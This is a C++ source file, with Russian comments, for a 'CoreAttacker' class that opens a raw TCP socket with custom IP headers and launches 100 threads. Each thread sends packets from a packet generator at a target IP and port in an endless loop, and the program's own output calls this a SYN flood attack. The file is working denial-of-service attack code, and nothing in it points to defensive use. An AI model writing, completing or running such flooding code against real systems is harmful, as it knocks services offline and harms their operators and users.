#include "attacker.hpp"
#include "packet.hpp"          
#include <iostream>           
#include <sys/socket.h>       
#include <netinet/in.h>       
#include <netinet/ip.h>        
#include <arpa/inet.h>         
#include <unistd.h>            
#include <stdexcept>
#include <thread>

CoreAttacker::CoreAttacker(const TargetInfo& target)
    : target_(target) 
{
    create_raw_socket();
    set_socket_options();
}

// Создание Сырого Сокета
void CoreAttacker::create_raw_socket() {
    this->raw_socket_fd_ = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    
    if (this->raw_socket_fd_ < 0) {
        throw std::runtime_error("Failed to create raw socket. Try running with 'sudo'.");
    }
    std::cout << "Raw socket created successfully (FD: " << this->raw_socket_fd_ << ")" << std::endl;
}

void CoreAttacker::set_socket_options() {
    int one = 1;
    const int* val = &one;
    
    if (setsockopt(this->raw_socket_fd_, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        throw std::runtime_error("Failed to set IP_HDRINCL option.");
    }
}

const int NUM_THREADS = 100;
void CoreAttacker::start_flood() {
    std::cout << "Starting SYN flood attack with " << NUM_THREADS << " threads..." << std::endl;
    
    std::vector<std::thread> workers;

    // Запускаем все потоки
    for (int i = 0; i < NUM_THREADS; ++i) {
        workers.emplace_back(&CoreAttacker::attack_thread_loop, this);
    }
    
    join_threads(workers);
}

void CoreAttacker::attack_thread_loop() {
    PacketGenerator generator(target_);
    
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_.port);
    target_addr.sin_addr.s_addr = inet_addr(target_.ip.c_str());
    
    // Бесконечный цикл отправки для этого потока
    while (true) {
        // 1. Получаем готовый сырой пакет
        std::vector<char> raw_packet = generator.get_raw_packet();
        
        // 2. Отправка пакета
        ssize_t sent_bytes = sendto(
            this->raw_socket_fd_,                   
            raw_packet.data(),                      
            raw_packet.size(),                      
            0,                                      
            (struct sockaddr*)&target_addr,         
            sizeof(target_addr)                     
        );

        if (sent_bytes < 0) {
            std::cerr << "Thread error sending packet!" << std::endl;
        }
    }
}

void CoreAttacker::join_threads(std::vector<std::thread>& threads) {
    for (auto& t : threads) {
        if (t.joinable()) {
            t.join();
        }
    }
}
